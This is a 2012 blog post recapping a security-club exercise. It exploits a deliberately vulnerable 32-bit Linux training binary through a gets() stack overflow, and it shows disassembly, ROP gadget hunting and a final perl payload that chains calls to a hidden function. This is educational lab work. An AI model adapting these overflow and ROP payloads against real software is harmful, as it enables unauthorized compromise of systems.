---
author: barongearmu
comments: true
date: 2012-03-30 03:00:19+00:00
layout: post
slug: buffer-overflows-stack-smashing-aslr-rop
title: Buffer Overflows - Stack Smashing, ASLR, ROP
wordpress_id: 74
categories:
- Meeting Re-caps
tags:
- aslr
- binary
- buffer overflow
- flow of control
- ROP
- segmentation fault
- stack overflow
- stack smash
---

Kris wrote a clever program with some interesting constants inside to be able to illustrate all of these concepts in a single binary. There are several things you can do here.

Basic stack overflow. Get the program to call a function that is compiled in, but not used in the standard flow of control. Then call it with appropriate arguments.

More advanced stack overflow, with ROP. Call the hidden function several times, with appropriate arguments each time.

Get shell on a system with ASLR, using the hidden constant.

???? Do something more awesome!!!!

Identify it

>>> file b2
b2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped

okay, 32-bit linux elf.

>>> strings b2
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
gets
puts
printf
__libc_start_main
GLIBC_2.0
PTRh@
UWVS
[^_]
WTF %d %d %d
Hello, %s!
What is your name?
;*2$"

looks like some format strings in there.

Run it:

>>>

>>>  ./b2
What is your name?
> hacker
Hello, hacker!

Break it:

>>> perl -e 'print "A"x400 ;' | ./b2
What is your name?
> Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Segmentation fault

Let's take an assembly listing of the interesting parts for future reference

>>> objdump -d -M intel b2

08048434 <wtf>:
8048434:       55                      push   ebp
8048435:       89 e5                   mov    ebp,esp
8048437:       83 ec 28                sub    esp,0x28
804843a:       c7 45 f4 0c ff e4 00    mov    DWORD PTR [ebp-0xc],0xe4ff0c
8048441:       b8 a0 85 04 08          mov    eax,0x80485a0
8048446:       8b 55 f4                mov    edx,DWORD PTR [ebp-0xc]
8048449:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
804844d:       8b 55 0c                mov    edx,DWORD PTR [ebp+0xc]
8048450:       89 54 24 08             mov    DWORD PTR [esp+0x8],edx
8048454:       8b 55 08                mov    edx,DWORD PTR [ebp+0x8]
8048457:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
804845b:       89 04 24                mov    DWORD PTR [esp],eax
804845e:       e8 cd fe ff ff          call   8048330 <printf@plt>
8048463:       c9                      leave
8048464:       c3                      ret

08048465 <sayhello>:
8048465:       55                      push   ebp
8048466:       89 e5                   mov    ebp,esp
8048468:       81 ec e8 00 00 00       sub    esp,0xe8
804846e:       b8 ae 85 04 08          mov    eax,0x80485ae
8048473:       89 04 24                mov    DWORD PTR [esp],eax
8048476:       e8 b5 fe ff ff          call   8048330 <printf@plt>
804847b:       8d 85 30 ff ff ff       lea    eax,[ebp-0xd0]
8048481:       89 04 24                mov    DWORD PTR [esp],eax
8048484:       e8 b7 fe ff ff          call   8048340 <gets@plt>
8048489:       b8 b1 85 04 08          mov    eax,0x80485b1
804848e:       8d 95 30 ff ff ff       lea    edx,[ebp-0xd0]
8048494:       89 54 24 04             mov    DWORD PTR [esp+0x4],edx
8048498:       89 04 24                mov    DWORD PTR [esp],eax
804849b:       e8 90 fe ff ff          call   8048330 <printf@plt>
80484a0:       c9                      leave
80484a1:       c3                      ret

080484a2 <main>:
80484a2:       55                      push   ebp
80484a3:       89 e5                   mov    ebp,esp
80484a5:       83 e4 f0                and    esp,0xfffffff0
80484a8:       83 ec 10                sub    esp,0x10
80484ab:       c7 04 24 bd 85 04 08    mov    DWORD PTR [esp],0x80485bd
80484b2:       e8 99 fe ff ff          call   8048350 <puts@plt>
80484b7:       e8 a9 ff ff ff          call   8048465 <sayhello>
80484bc:       b8 00 00 00 00          mov    eax,0x0
80484c1:       c9                      leave
80484c2:       c3                      ret
80484c3:       90                      nop
80484c4:       90                      nop

We can see that this wtf function never gets called, as it has a print statement, but we never saw anything like that in our output.

sayhello has what looks like a ~200 byte buffer from

8048468:       81 ec e8 00 00 00       sub    esp,0xe8

and more importantly that it is using gets to read, which means we can put anything but nul chars into it, and it will read them into the buffer. This is our vulnerable code fragment!

Alright, now let's look at it in gdb.





Calling hidden WTF function with correct arguments multiple times.

** WTF with correct arguments
to call wtf more than once, with arguments, we need a 'cleanup' program
what this needs to do is move the stack pointer down two four-byte groups
so that we jump over the parameters to wtf. the return at the end of wtf,
and the 'cleanup' series, get's rid of the other two addresses.
Thus we can repeat that four four-byte sequence as many times as we want
(realistically until it segfaults from the initial overflow.)

*** finding rops
poor man's rop finder, using objdump and searching for pop,pop,ret sequence.

first

two pops and a return
8048402:       5b                      pop    ebx
8048403:       5d                      pop    ebp
8048404:       c3                      ret

four pops and a return
804852c:       5b                      pop    ebx
804852d:       5e                      pop    esi
804852e:       5f                      pop    edi
804852f:       5d                      pop    ebp

two pops and a return
8048577:       5b                      pop    ebx
8048578:       5d                      pop    ebp
8048579:       c3                      ret

** final exploit code.
REMEMBER: Addresses are little endian on x86

perl -e 'print "A"x212 . "\x34\x84\x04\x08" . "\x02\x84\x04\x08" . "\x00\x00\x00\x00" . "\xFF\xFF\xFF\xFF" \
. "\x34\x84\x04\x08" . "\x77\x85\x04\x08" . "\x00\x00\x00\x00" . "\xFF\xFF\xFF\xFF" \
. "\x34\x84\x04\x08" . "\x2e\x85\x04\x08" . "\x00\x00\x00\x00" . "\xFF\xFF\xFF\xFF" ;' | ./b2
|                        |                   ^ 0                  ^ -1
|                        ^ three different addresses with correct assembly instructions
^ start address of wtf

What is your name?
> Hello,                                                                                                                                                                                                                     4!
WTF 0 -1 15007500
WTF 0 -1 15007500
WTF 0 -1 15007500
Segmentation fault

Graceful termination is not the point here.
